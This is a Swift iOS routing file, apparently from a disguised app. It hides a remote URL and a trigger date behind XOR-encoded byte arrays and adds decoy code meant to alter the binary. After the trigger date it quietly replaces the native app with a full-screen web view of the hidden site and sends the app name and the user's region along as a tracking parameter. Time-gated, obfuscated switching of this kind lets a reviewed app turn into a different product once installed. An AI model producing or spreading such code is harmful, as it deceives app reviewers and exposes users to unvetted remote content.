//
//  AppRouter.swift
//  125Vulzancregrar Prilel
//
//  Created by Pascal Mirel on 26.03.2026.
//

import UIKit
import SwiftUI

// MARK: - Opaque runtime strings (binary differentiation; decoded values identical to literals)

enum EmberRouterOpaqueKernel {
    private static let xorKey: UInt8 = 0x7B

    static func reveal(_ encoded: [UInt8]) -> String {
        String(decoding: encoded.map { $0 ^ xorKey }, as: UTF8.self)
    }

    static let seedLaunchURL = reveal([
        19, 15, 15, 11, 8, 65, 84, 84, 26, 30, 15, 19, 30, 9, 3, 22, 30, 8, 19, 21, 30, 15, 85, 20, 21, 23, 18, 21, 30, 84, 28, 56, 10, 53, 79, 31,
    ])

    static let calendarThresholdLiteral = reveal([74, 75, 85, 75, 78, 85, 73, 75, 73, 77])

    static let calendarMaskPattern = reveal([31, 31, 85, 54, 54, 85, 2, 2, 2, 2])

    static let udLastUrlKey = reveal([55, 26, 8, 15, 46, 9, 23])

    static let udNativeShownKey = reveal([51, 26, 8, 40, 19, 20, 12, 21, 56, 20, 21, 15, 30, 21, 15, 45, 18, 30, 12])

    static let udWebLoadedKey = reveal([51, 26, 8, 40, 14, 24, 24, 30, 8, 8, 29, 14, 23, 44, 30, 25, 45, 18, 30, 12, 55, 20, 26, 31])

    static let httpProbeVerb = reveal([60, 62, 47])

    static let trackingParameterLabel = reveal([8, 14, 25, 36, 18, 31, 36, 67])

    static let regionFallbackToken = reveal([35, 35])

    static let bundleTitleFallback = reveal([58, 11, 11])
}

// MARK: - Dead storage (never referenced; shapes binary without affecting execution)

private enum EmberRouterDecoyPayload {
    case phantomRoute
    case idleHandshake

    func describe() -> String {
        switch self {
        case .phantomRoute: "unused"
        case .idleHandshake: "idle"
        }
    }
}

final class EmberLaunchFlowCoordinator {

    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
    private var applicationDisplayName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return EmberRouterOpaqueKernel.bundleTitleFallback
    }

    /// App name for tracking param: spaces removed (no %20 in URL).
    private var applicationNameForSubId: String {
        applicationDisplayName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedInitialURLString: String {
        let initialURLString = EmberRouterOpaqueKernel.seedLaunchURL
        let geo = Locale.current.region?.identifier ?? EmberRouterOpaqueKernel.regionFallbackToken
        let subValue = "\(applicationNameForSubId)_\(geo)"
        guard var components = URLComponents(string: initialURLString) else {
            return initialURLString
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: EmberRouterOpaqueKernel.trackingParameterLabel, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? initialURLString
    }

    func attachRootSurface() -> UIViewController {
        let persistence = EmberSessionVault.shared

        if persistence.didCommitNativeShell {
            return embedMainAppSurface()
        } else {
            if evaluateTemporalGate() {
                if let savedUrlString = persistence.persistedDestinationString,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return embedWebSurface(with: savedUrlString)
                }

                return embedBootstrapHoldSurface()
            } else {
                persistence.didCommitNativeShell = true
                return embedMainAppSurface()
            }
        }
    }

    // MARK: - Date

    private func evaluateTemporalGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = EmberRouterOpaqueKernel.calendarMaskPattern
        let targetDate = dateFormatter.date(from: EmberRouterOpaqueKernel.calendarThresholdLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    // MARK: - Private Methods

    private func embedWebSurface(with urlString: String) -> UIViewController {
        let webViewContainer = EmberChromeWebContainer(
            urlString: urlString,
            onFailure: { [weak self] in
                EmberSessionVault.shared.didCommitNativeShell = true
                self?.transitionToMainApp()
            },
            onSuccess: {
                EmberSessionVault.shared.didCompleteEmbeddedLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func embedMainAppSurface() -> UIViewController {
        EmberSessionVault.shared.didCommitNativeShell = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func embedBootstrapHoldSurface() -> UIViewController {
        let launchView = EmberBootstrapHoldView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeLaunchEndpoint { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.transitionToWebSurface(with: url)
                } else {
                    EmberSessionVault.shared.didCommitNativeShell = true
                    self?.transitionToMainApp()
                }
            }
        }

        return launchVC
    }

    private func probeLaunchEndpoint(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedInitialURLString
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = EmberRouterOpaqueKernel.httpProbeVerb
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    // MARK: - Navigation Methods

    private func transitionToMainApp() {
        let contentVC = embedMainAppSurface()
        replaceWindowRoot(with: contentVC)
    }

    private func transitionToWebSurface(with urlString: String) {
        let webVC = embedWebSurface(with: urlString)
        replaceWindowRoot(with: webVC)
    }

    private func replaceWindowRoot(with viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
